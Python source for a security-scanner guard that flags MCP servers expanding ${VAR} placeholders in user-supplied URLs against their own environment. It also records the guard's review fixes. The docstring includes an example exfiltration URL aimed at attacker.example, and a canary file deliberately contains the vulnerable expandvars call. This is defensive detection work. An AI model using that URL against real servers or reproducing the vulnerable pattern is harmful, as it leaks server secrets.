"""Guard: MCP server resolves ${VAR}/$VAR placeholders in user-supplied config against its
own process environment (checklist §4, new item — the batch).

An MCP server that accepts a user-supplied server URL (or other config value) and resolves
``${VAR}``/``$VAR`` placeholders inside it against its OWN process environment leaks its own
secrets to whoever controls that URL. An authenticated user submits
``https://attacker.example/?k=${JWT_SECRET}`` and the server interpolates its own
``JWT_SECRET`` into the outbound request before sending it — the placeholder resolver has no
way to distinguish "an admin's trusted config template" from "an attacker's submitted string."

Real precedent: **CVE-2026-32625** (LibreChat <= 0.8.3, CVSS 9.6, CWE-200) — the server
resolved ``${VAR}`` against ``process.env`` during Zod validation of a user-supplied MCP server
URL, leaking ``CREDS_KEY``, ``JWT_SECRET``, ``MONGO_URI``.

Fires CRITICAL on, in an MCP-context file only (the file must reference ``mcp``,
``modelcontextprotocol``, ``McpServer``, ``StdioServerParameters``, ``mcpServers``, or a
``server_url``/``serverUrl``-shaped identifier):

  * Python — ``os.path.expandvars(<value>)`` (expands ``$VAR``/``${VAR}`` against
    ``os.environ``), or ``.format(**os.environ)`` / ``.format_map(os.environ)``;
  * TS/JS — a ``.replace(`` call whose first argument carries a ``${`` placeholder and whose
    replacer (within the same call) reads ``process.env``.

Ported from `agent-audit-kit`'s real ``mcp_env_placeholder_exfil.py`` (fetched and read in
full; detection regexes are verbatim, including the MCP-context gate and the TS comment-strip
pass so a comment mentioning ``process.env`` cannot mask the check).

Suppress an audited, intentional case with the inline pragma:

    os.path.expandvars(trusted_template)  # security: allow-mcp-env-placeholder-exfil

**2026-09-23 fix (Dean's review, agentic pre-review H-6/H-8):** the hand-rolled
TS comment stripper was replaced with the shared `strip_js_comments` (100-290x faster on
measured inputs, and it was also silently WRONG: replacing a multi-line `/* ... */` block with
a single space collapsed the newlines inside it, shifting every subsequent line's reported
`lineno`). `_TS_ENV_PLACEHOLDER_RE`'s first `[^;]*?` span was unbounded, real quadratic-time
blowup on a large file whose `.replace(` never reaches the placeholder pattern (measured up to
95s on a 167 KB file) — bounded to the same `{0,200}` cap the second span already used. The
`#`-anchored pragma never matched in the TS/JS files this guard scans (`#` is not that
language's comment marker) — replaced with a plain substring, matching every sibling guard's
own convention.

**2026-09-23 (Dean's review, agentic pre-review H-4, partial fix + disclosed
remaining gap):** the Python-side check used to be a pure file-wide co-occurrence match (MCP-
context marker + `expandvars`/format-env call ANYWHERE, no link between them at all) — verified
CRITICAL on `LOG_DIR = os.path.expandvars('$HOME/logs')` in a file merely mentioning
`server_url` elsewhere, a hardcoded log-directory path with no caller influence whatsoever.
Now excludes a call whose argument (for `expandvars`) or receiver (for `.format`/`.format_map`)
is a plain string literal — fixed at read time, can never vary by caller, regardless of what
env var name happens to appear inside it. **Not fixed, disclosed rather than guessed:** a bare
variable (`os.path.expandvars(raw)`) is left firing even when `raw` turns out to be a hardcoded
local constant a few lines up — this guard does no cross-line taint tracking either way, the
same accepted-scope shape as `code-injection-eval-exec`'s own bare-variable-is-dynamic rule, so
narrowing further would need real taint analysis this guard was never designed to do.

**2026-09-24 fix (Dean's review, round 2):** the MCP-context marker used to be checked
file-wide, so a bare-variable call still fired CRITICAL when the file's ONLY MCP mention was a
docstring nowhere near the actual call — a hardcoded log-directory helper in a module whose
top-of-file docstring happens to say "MCP" is not evidence that call handles MCP server config.
The marker must now appear within a ±15-line window of the finding itself (proximity, not full
dataflow — this guard still has no AST/taint engine).

**2026-09-24 fix (PR #923 round-3 re-review, H1):** the ±15-line window alone dropped real
CRITICAL findings: a genuine MCP server (`from mcp.server import Server` at the top, the
`expandvars` call deep in a long `@server.call_tool()` handler) lost sight of its own import,
and only the EARLIEST candidate call was ever proximity-tested, so an unrelated call near the top
hid a real one sitting right next to `server_url` further down. A candidate now fires when a
marker is within the window of it, OR, in Python, when the file really uses the MCP SDK (an SDK
import or a low-level `@x.call_tool` decorator, read with comments and docstrings blanked) AND the
candidate sits inside an MCP tool handler (its innermost function is decorated `@x.call_tool` /
`@x.tool` / `@x.resource` / `@x.prompt`, read from the AST). A handler receives caller-supplied
arguments, which is the threat model; an unrelated cache-dir helper elsewhere in the same file
does not. Two broader fallbacks were each measured firing CRITICAL on benign code in the round-4
reviews: "any marker in code" (a distant string or a parameter named `server_url`) and "SDK use
anywhere in the file" (every MCP client's unrelated `expandvars`). TS/JS stays window-only: three
regex-built handler-span schemes each broke on ordinary code (a regex literal `/[(]/` or `/\\(/`
unbalanced them, a `this.handle` callback escaped them), and without a TS parser the honest
choice is the `e6f95e89` behaviour, disclosed. Every candidate is considered, in file order, and
the finding anchors on the first one that qualifies.

**#1055 (JS/TS sinks in live code only):** a TS/JS candidate counts only when the `(` of its
`.replace(` call and the replacer's `process.env` are both live code on the shared anchor mask
(`js_code_matches`): a whole call spelled out in a docs string, or a `'process.env ...'` string
passed as the replacement, no longer fires CRITICAL, while a call inside a `${...}` substitution
still does. The `${` placeholder itself is not tested, because it lives in the pattern argument, a
string or regex literal by nature. The MCP-context gate stays a plain match: a `'mcpServers'` key
or a `serverUrl` string is real evidence.
"""
from __future__ import annotations

import ast
import re
from collections.abc import Iterator
from pathlib import Path

from agentsec.astutil import safe_ast_parse
from agentsec.detect import StackProfile
from agentsec.findings import Finding

from .base import (
    CanaryPlant,
    Guard,
    comment_dialect_for,
    is_nonproduct_path,
    iter_files,
    js_code_matches,
    pragma_present,
    read,
    rel,
    split_call_args,
    strip_js_comments,
    strip_python_line_comment,
    strip_python_strings,
)

# The file must look like it handles MCP server config / URLs at all — same gate the real
# source uses, so an unrelated app that happens to call os.path.expandvars() for something
# else entirely does not fire.
_MCP_CTX_RE = re.compile(
    r"\bmcp\b|modelcontextprotocol|McpServer|StdioServerParameters|"
    r"mcpServers|server[_-]?url|serverUrl",
    re.IGNORECASE,
)

# TS: a `.replace(` whose first arg carries a `${` placeholder, followed (same call) by a
# replacer that reads `process.env`. Tolerant of escaping and whitespace/newlines, same as
# the real source.
#
# **2026-09-23 fix (Dean's review, agentic pre-review H-6):** the first `[^;]*?`
# span was UNBOUNDED — on a large file with a `.replace(` that never actually reaches a
# `${`/`process.env` pair, the engine's lazy backtracking scans an increasingly large tail from
# every candidate start, real quadratic-time blowup (measured: 42 KB -> 4.9s, 84 KB -> 23.7s,
# 167 KB -> 94.9s). Bounded to the same `{0,200}` cap the second span already used — a
# `.replace(...)` call legitimately spanning more than 200 chars before its placeholder is not
# a realistic shape this guard needs to catch anyway.
_TS_ENV_PLACEHOLDER_RE = re.compile(
    r"\.replace\s*\(\s*"          # .replace(
    r"[^;]{0,200}?\\?\$\\?\{"     # first arg carries a ${ placeholder
    r"(?P<tail>[^;]{0,200}?)"     # ...up to the replacer (escaping-tolerant)
    r"process\.env",              # ...which reads process.env
    re.DOTALL,
)
_TS_PROCESS_ENV_RE = re.compile(r"process\.env")
# How far past its placeholder `_TS_ENV_PLACEHOLDER_RE` reaches for the replacer: the `tail` cap
# plus the `process.env` token itself.
_TS_TAIL_REACH = 200 + len("process.env")


def _replace_paren(m: re.Match[str]) -> int:
    """The `(` of a `_TS_ENV_PLACEHOLDER_RE` match's `.replace(`, the anchor `js_code_matches` tests."""
    return m.start() + m.group().index("(")


def _ts_code_candidates(code: str, mask: str) -> Iterator[re.Match[str]]:
    """Every `_TS_ENV_PLACEHOLDER_RE` match in `code` (the default `strip_js_comments` view) whose
    `.replace(` paren and replacer `process.env` are both live code on `mask`, the anchor mask
    (#1055). The regex stops at the first `process.env` after the placeholder, which may be a quoted
    one, so the replacer is looked for again over the regex's own reach (up to `_TS_TAIL_REACH`
    characters, cut at a `;` as the regex is): a `'process.env'` string before the real read in the
    same call cannot hide it."""
    for m in js_code_matches(_TS_ENV_PLACEHOLDER_RE, code, mask, anchor=_replace_paren):
        lo = m.start("tail")
        hi = min(len(code), lo + _TS_TAIL_REACH)
        semi = code.find(";", lo, hi)
        if semi != -1:
            hi = semi
        if any(js_code_matches(_TS_PROCESS_ENV_RE, code[lo:hi], mask[lo:hi], anchor=lambda e: e.start())):
            yield m


# Python: expandvars expands $VAR/${VAR} against os.environ.
_PY_EXPANDVARS_RE = re.compile(r"\bos\.path\.expandvars\s*\(")
# Python: format/format_map spreading the whole environment into a template.
_PY_FORMAT_ENV_RE = re.compile(
    r"\.format(?:_map)?\s*\(\s*(?:\*\*\s*os\.environ\b|os\.environ\s*\))"
)

# A plain (non-f) string literal, the WHOLE trimmed text, no concatenation. If the value being
# expanded/formatted is a literal like `'$HOME/logs'`, it is fixed at read time and can never
# vary by caller — the guard's own threat model (a caller-supplied value gets its placeholders
# resolved) does not apply, regardless of what env var name happens to appear inside it.
# 2026-09-23 fix (Dean's review, agentic pre-review H-4): this guard used to be a
# pure file-wide co-occurrence check (MCP-context marker + expandvars/format-env ANYWHERE, no
# link between them at all) -- verified CRITICAL on `LOG_DIR = os.path.expandvars('$HOME/logs')`
# in a file merely mentioning `server_url` elsewhere, and on `os.path.expanduser(os.path.
# expandvars(raw))` in a file whose docstring just says "MCP". A literal-argument exclusion
# closes the clearest, unambiguous half of this gap; a bare variable (`raw` above) is left
# firing since it MAY be caller-supplied and this guard does no taint tracking either way
# (same accepted-scope shape as `code-injection-eval-exec`'s own bare-variable-is-dynamic rule).
_STATIC_STRING_LITERAL = re.compile(r"""^[rRbBuU]{0,2}(['"]).*\1$""", re.DOTALL)
_FSTRING_PREFIX = re.compile(r"^[rR]?[fF]['\"]")

# **2026-09-24 fix (Dean's review, round 2):** `_MCP_CTX_RE` used to gate on the WHOLE file,
# so a bare variable (`os.path.expandvars(raw)`) still fired CRITICAL when the file's only MCP
# signal was a docstring mention nowhere near the actual call — a hardcoded log-directory
# helper in a module whose top-of-file docstring happens to say "MCP" is not evidence THIS
# call handles MCP server config. The marker must now appear within a nearby line window of
# the actual finding, not just anywhere in the file — proximity, not full dataflow (this guard
# has no AST/taint engine, same disclosed-scope shape as the bare-variable gap itself).
_MCP_PROXIMITY_LINES = 15


def _is_static_string_literal(arg: str) -> bool:
    a = arg.strip()
    if not a or _FSTRING_PREFIX.match(a):
        return False
    return bool(_STATIC_STRING_LITERAL.match(a)) and "+" not in a


def _format_receiver_is_static_literal(text: str, dot_idx: int) -> bool:
    """True if the text immediately before `dot_idx` (the position of the `.` in
    `.format(`/`.format_map(`) is a complete plain (non-f) string literal — e.g.
    `'template'.format(...)`. A naive backward scan, not escape-aware — good enough for this
    guard's own line-oriented heuristic scope; an escaped quote character inside the literal is
    a rare enough shape to accept as a known limitation rather than a full tokenizer."""
    i = dot_idx - 1
    if i < 0 or text[i] not in "'\"":
        return False
    quote = text[i]
    j = text.rfind(quote, 0, i)
    if j == -1:
        return False
    prefix = text[max(0, j - 2) : j]
    return "f" not in prefix.lower()


def _py_real_finding_candidates(text: str) -> list[tuple[int, str]]:
    """Every `(position, marker)` of a real (non-literal-argument) expandvars/format-env call in
    `text`, in file order. All of them, not just the first: an earlier occurrence might be a safe
    literal, or an unrelated call far from any MCP context, while a later one is real (#923
    round-3 H1)."""
    candidates: list[tuple[int, str]] = []
    for m in _PY_EXPANDVARS_RE.finditer(text):
        args = split_call_args(text, m.end() - 1, python=True)
        arg = args[0] if args else ""
        if not _is_static_string_literal(arg):
            candidates.append((m.start(), "os.path.expandvars"))
    for m in _PY_FORMAT_ENV_RE.finditer(text):
        if not _format_receiver_is_static_literal(text, m.start()):
            candidates.append((m.start(), "os.environ"))
    return sorted(candidates)


# Real MCP SDK use: an import of the SDK (Python `mcp`/`fastmcp`, TS/JS `@modelcontextprotocol/*`
# or `fastmcp`) or a low-level server's tool decorator. Deliberately NOT the whole `_MCP_CTX_RE`
# vocabulary: its bare `server_url`/`mcp` tokens also match an unrelated helper's parameter or a
# single-line string, which re-opened the file-wide co-occurrence FP (#923 round-4 review).
_MCP_SDK_USE_RE = re.compile(
    r"^[ \t]*(?:from|import)[ \t]+(?:mcp|fastmcp)\b"
    r"|^[ \t]*@\w+\.(?:call_tool|list_tools)\b"
    r"""|(?:\bfrom|\brequire\s*\(|\bimport\s*\(?)\s*['"](?:@modelcontextprotocol/|fastmcp['"/])""",
    re.MULTILINE,
)


def _mcp_sdk_used(text: str, is_py: bool, filename: Path) -> bool:
    """True iff the file really uses the MCP SDK (see `_MCP_SDK_USE_RE`), read with comments and
    (Python) triple-quoted strings blanked. A real server's import counts however far it sits
    from the call, so a long `@server.call_tool()` handler keeps its context (#923 round-3 H1);
    a comment, docstring, string or identifier that merely says "MCP"/`server_url` does not."""
    if is_py:
        code = "\n".join(
            strip_python_line_comment(ln)
            for ln in strip_python_strings(text, filename=filename).splitlines()
        )
    else:
        code = strip_js_comments(text)
    return bool(_MCP_SDK_USE_RE.search(code))


# The attribute name of a decorator that registers an MCP tool/resource/prompt handler:
# `@server.call_tool()`, `@mcp.tool()`, `@app.resource("x://{id}")`, whatever the receiver.
_HANDLER_DECORATOR_ATTRS = frozenset({"call_tool", "tool", "resource", "prompt"})
# Cheap textual pre-check, so a file with no such decorator is never parsed for this.
_PY_HANDLER_DECORATOR_HINT = re.compile(r"@[\w. \t]*\.[ \t]*(?:call_tool|tool|resource|prompt)\b")


def _is_handler_decorator(dec: ast.expr) -> bool:
    target = dec.func if isinstance(dec, ast.Call) else dec
    return isinstance(target, ast.Attribute) and target.attr in _HANDLER_DECORATOR_ATTRS


def _py_handler_lines(text: str, filename: Path) -> set[int]:
    """1-based lines whose INNERMOST enclosing function is decorated as an MCP tool handler,
    built once per file from the AST (#923 round-4 re-review). Only a function's own decorators
    count, so a factory whose body registers a nested handler is not itself a handler, and a
    closure nested inside a handler is not one either. Reading decorators from the AST, not from
    text, keeps a string default on the `def` line from hiding them, and the per-candidate check
    is a set lookup: routing each candidate through `enclosing_function_span` rescanned every
    function per candidate, which measured quadratic."""
    if not _PY_HANDLER_DECORATOR_HINT.search(text):
        return set()
    tree = safe_ast_parse(text, filename=filename)
    if tree is None:
        return set()
    funcs = [n for n in ast.walk(tree) if isinstance(n, ast.FunctionDef | ast.AsyncFunctionDef)]
    # Outermost first, so an inner function's lines overwrite its enclosing function's verdict.
    funcs.sort(key=lambda n: (n.end_lineno or n.lineno) - n.lineno, reverse=True)
    is_handler: dict[int, bool] = {}
    for fn in funcs:
        verdict = any(_is_handler_decorator(d) for d in fn.decorator_list)
        for line in range(fn.lineno, (fn.end_lineno or fn.lineno) + 1):
            is_handler[line] = verdict
    return {line for line, verdict in is_handler.items() if verdict}


def _mcp_context_near(lines: list[str], lineno: int, window: int = _MCP_PROXIMITY_LINES) -> bool:
    """True iff an MCP-context marker appears within `window` lines of 0-based line `lineno`:
    proximity evidence that THIS call, not just the file somewhere, handles MCP server config
    (#289 round 2). Takes pre-split lines so a many-candidate file is not re-split per call."""
    lo = max(0, lineno - window)
    hi = min(len(lines), lineno + window + 1)
    return bool(_MCP_CTX_RE.search("\n".join(lines[lo:hi])))

# 2026-09-23 fix (Dean's review, agentic pre-review H-8): a `#`-anchored regex
# never matches in the JS/TS files this guard also scans (`#` is not that language's line-
# comment marker), so `// security: allow-...` silently never suppressed anything there. A
# plain substring, matching every other JS/TS guard's own pragma convention (js_code_injection.py
# and siblings), works in any comment style regardless of language.
_PRAGMA = "security: allow-mcp-env-placeholder-exfil"
# A UTF-8 BOM survives `read()` (it decodes as "utf-8", not "utf-8-sig"), and `ast.parse` rejects a
# str that starts with one, which silently emptied the handler map (#923 round-4 re-review).
# Spelled as an escape: agentsec's own invisible-unicode guard reads this file.
_BOM = "\ufeff"

_PY_SUFFIXES = (".py",)
_TS_SUFFIXES = (".ts", ".tsx", ".js", ".mjs", ".cjs")
_STANDARDS = ["OWASP:A02", "CWE-200", "OWASP-ASI:ASI04"]




class McpEnvPlaceholderExfilGuard(Guard):
    id = "mcp-env-placeholder-exfil"
    title = "MCP server resolves ${VAR} placeholders against its own process environment"
    area = "AI agent"

    # mcp_url_resolver.py: os.path.expandvars() on a user-supplied MCP server URL, in an
    # MCP-context file -> fires mcp-env-placeholder-exfil/env-placeholder-resolution.
    canary_plant = CanaryPlant(
        files={
            "mcp_url_resolver.py": (
                "import os\n"
                "\n"
                "def connect_mcp_server(server_url: str) -> str:\n"
                "    return os.path.expandvars(server_url)\n"
            ),
        },
        expects=frozenset({
            "mcp-env-placeholder-exfil/env-placeholder-resolution",
        }),
    )

    def applies(self, profile: StackProfile) -> bool:
        return "mcp" in profile.features

    def run(self, root: Path, profile: StackProfile) -> list[Finding]:
        out: list[Finding] = []
        for f in iter_files(root, _PY_SUFFIXES + _TS_SUFFIXES):
            if is_nonproduct_path(rel(root, f), profile.archive_segments):
                continue
            out.extend(self._scan(root, f))
        return out

    def _scan(self, root: Path, f: Path) -> list[Finding]:
        text = read(f).removeprefix(_BOM)  # not a line break, so line numbers are unchanged
        if not text or pragma_present(_PRAGMA, text, dialect=comment_dialect_for(f)):
            return []
        if not _MCP_CTX_RE.search(text):
            return []

        is_py = f.suffix in _PY_SUFFIXES
        if is_py:
            # The window reads raw text on the Python side: the enclosing function's own
            # docstring is nearby evidence (test_bare_variable_with_nearby_mcp_signal_still_fires).
            near_text = text
            candidates = _py_real_finding_candidates(text)
        else:
            near_text = strip_js_comments(text)
            candidates = []
            if _TS_ENV_PLACEHOLDER_RE.search(near_text):
                mask = strip_js_comments(text, strip_strings=True, keep_substitutions=True)
                candidates = [(m.start(), "process.env") for m in _ts_code_candidates(near_text, mask)]
        if not candidates:
            return []

        near_lines = near_text.splitlines()
        hit = None
        sdk_used: bool | None = None
        handler_lines: set[int] | None = None
        # Candidates are in file order, so their line numbers are counted incrementally: a
        # per-candidate count from offset 0 made a many-candidate file quadratic.
        line0, counted_to = 0, 0
        for cand in candidates:
            line0 += near_text.count("\n", counted_to, cand[0])
            counted_to = cand[0]
            if _mcp_context_near(near_lines, line0):
                hit = cand
                break
            if not is_py:
                continue  # TS/JS: window only (module docstring, round-4 re-review)
            if sdk_used is None:
                sdk_used = _mcp_sdk_used(text, is_py, f)
            if not sdk_used:
                continue
            if handler_lines is None:
                handler_lines = _py_handler_lines(text, f)
            if line0 + 1 in handler_lines:
                hit = cand
                break
        if hit is None:
            return []
        pos, marker = hit

        lineno = text[:pos].count("\n") + 1
        return [self._finding(root, f, lineno, marker)]

    def _finding(self, root: Path, f: Path, line: int, marker: str) -> Finding:
        return Finding(
            check_id=self.id,
            severity="critical",
            title=self.title,
            location=f"{rel(root, f)}:{line}",
            message=(
                f"An MCP-context file resolves ${{VAR}}/$VAR placeholders against the "
                f"process environment ({marker}) while handling a user-supplied server "
                "config. A user-supplied URL containing ${SECRET} exfiltrates the "
                "server's own secrets the moment it is resolved and used "
                "(CVE-2026-32625, CWE-200)."
            ),
            remediation=(
                "Never expand environment-variable placeholders found inside "
                "untrusted/user-supplied config values. Resolve placeholders only in "
                "config the operator authored (a trusted template file), never in a "
                "value a caller submitted at request time. If interpolation is genuinely "
                "needed, resolve against an explicit allow-listed variable set, not the "
                "full process environment."
            ),
            rule="mcp-env-placeholder-exfil/env-placeholder-resolution",
            standards=list(_STANDARDS),
        )
